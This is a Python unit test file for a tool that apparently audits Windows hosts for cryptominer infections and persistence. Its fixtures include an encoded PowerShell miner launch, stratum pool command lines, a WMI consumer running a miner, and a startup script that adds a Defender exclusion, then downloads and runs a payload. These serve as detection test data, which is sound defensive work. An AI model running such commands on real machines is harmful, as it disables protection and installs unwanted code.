import sys
import base64
from pathlib import Path
import unittest
sys.path.insert(0,str(Path(__file__).resolve().parents[1]))
import audit


def baseline():
    return dict(schema_version=1,processes=[],tasks=[],startup=[],defender={},hosts=[],acl_blocks=[],remote={},health=[],errors=[])


class ExtendedTests(unittest.TestCase):
    def test_encoded_powershell_is_decoded_only_as_text_and_redacted(self):
        payload='miner -o stratum+tcp://pool.example:443 -u wallet-example --donate-level=1'
        encoded=base64.b64encode(payload.encode('utf-16-le')).decode('ascii')
        command='powershell.exe -EncodedCommand '+encoded
        self.assertTrue(audit.miner_command(command))
        self.assertNotIn(encoded,audit.redact(command))
        self.assertFalse(audit.miner_command('powershell.exe -enc not-valid-base64!'))

    def test_gpu_miner_syntax_and_benign_output_flag(self):
        self.assertTrue(audit.miner_command('t-rex -a kawpow -o stratum+tcp://pool.example:3333 -u example'))
        self.assertTrue(audit.miner_command('worker --pool stratum+ssl://pool.example:443 --wallet example'))
        self.assertFalse(audit.miner_command('converter -o output.bin --algorithm zstd'))

    def test_invalid_numeric_measurements_rejected(self):
        for value in ('100',float('nan'),-1):
            sample=baseline();sample['performance']=[dict(pid=1,cpu_percent=value)]
            with self.assertRaises(ValueError):audit.analyze(sample)

    def rules(self, sample):
        return [x['rule'] for x in audit.analyze(sample)['findings']]

    def test_deep_mode_requires_all_additional_sections(self):
        sample=baseline(); sample['scan_mode']='deep'
        self.assertEqual(audit.analyze(sample)['status'],'incomplete')
        sample.update({name:[] for name in audit.DEEP_SECTIONS})
        self.assertEqual(audit.analyze(sample)['status'],'no_rule_matches')
        self.assertEqual(len(audit.analyze(sample)['coverage_details']),14)

    def test_service_and_wmi_mining_persistence(self):
        sample=baseline()
        sample['services']=[dict(name='ExampleService',command=r'C:\ProgramData\WindowsTask\AppHost.exe',enabled=True)]
        sample['wmi']=[dict(name='ExampleConsumer',kind='CommandLineEventConsumer',command='miner -o pool.example:443 --donate-level=1')]
        self.assertIn('suspicious-persistence',self.rules(sample))
        self.assertIn('wmi-consumer',self.rules(sample))
        self.assertTrue(all(f['severity']=='high' for f in audit.analyze(sample)['findings']))

    def test_legitimate_wmi_and_optimizer_hook_are_not_malware_verdicts(self):
        sample=baseline()
        sample['wmi']=[dict(name='Inventory',command='inventory.exe --collect')]
        sample['hijacks']=[dict(name='CompatTelRunner.exe',kind='IFEO',command=r'C:\Windows\System32\systray.exe')]
        result=audit.analyze(sample)
        self.assertEqual(result['status'],'no_rule_matches')
        self.assertTrue(all(f['severity']=='info' for f in result['findings']))

    def test_port_and_cpu_need_correlated_process_evidence(self):
        sample=baseline()
        sample['processes']=[dict(pid=9,path=r'C:\ProgramData\Tool\worker.exe',signature='NotSigned')]
        sample['connections']=[dict(pid=9,port=3333,address='192.0.2.1')]
        sample['performance']=[dict(pid=9,cpu_percent=30)]
        self.assertEqual(set(self.rules(sample)),{'pool-port-correlation','cpu-correlation'})
        sample['processes'][0]['signature']='Valid'
        self.assertEqual(self.rules(sample),[])

    def test_startup_script_is_inspected_as_text(self):
        sample=baseline()
        sample['startup_files']=[dict(name='Example.ps1',command="Add-MpPreference -ExclusionPath C:\\ProgramData; Invoke-WebRequest https://example.invalid/payload; Start-Process payload.exe")]
        self.assertIn('startup-script',self.rules(sample))
        self.assertEqual(audit.analyze(sample)['findings'][0]['severity'],'high')

    def test_protected_processes_are_partial_coverage(self):
        sample=baseline()
        sample['errors']=['Some process paths/command lines are inaccessible. An elevated terminal may improve coverage.']
        self.assertEqual(audit.analyze(sample)['coverage_details']['processes'],'partial')

    def test_malformed_additional_section_rejected(self):
        sample=baseline(); sample['services']=['bad']
        with self.assertRaises(ValueError): audit.analyze(sample)


if __name__=='__main__': unittest.main()
